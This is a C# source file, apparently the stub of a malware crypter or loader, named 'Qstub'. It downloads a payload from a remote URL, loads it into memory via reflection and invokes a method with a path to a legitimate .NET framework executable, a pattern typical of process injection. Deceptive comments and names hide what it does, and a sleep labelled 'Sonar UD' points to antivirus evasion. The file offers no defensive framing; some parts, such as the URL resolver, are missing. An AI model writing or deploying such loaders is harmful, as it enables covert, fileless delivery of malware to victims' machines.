using System;
using System.IO;
using System.Text;
using System.Threading;


namespace Qstub
{
    class Program
    {
        public static byte[] bbga(string pita)
        {
            var wang = Convert.FromBase64String(pita);
            return wang;
        }

        static void Pain()
        {
            //Kids
            string kyes = "AKEY";
            bool delay = true;//ADELAY;
            int deltime = 1;//DTIME;
            string database = @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_regbrowsers.exe";

            //Sonar UD 
            if (delay) { Thread.Sleep(deltime); }

            //Regex link helper
            object connector = new object[] { database, string.Empty, null, true };
                
            //Chinese to english
            string nox = resolveDB();

            System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls12;
            var GOAT = new System.Net.WebClient();
            GOAT.Headers.Add("User-Agent: Mozilla 4.0");
            var just = GOAT.DownloadData(nox);

            System.Reflection.Assembly SSHLoad = System.Reflection.Assembly.Load(just);
            System.Reflection.BindingFlags FlagAttribute = System.Reflection.BindingFlags.InvokeMethod;
            SSHLoad.GetType("GreenLight.lotus").InvokeMember("Goblin", FlagAttribute, null, null, (object[])connector);
            
        }
    }
}
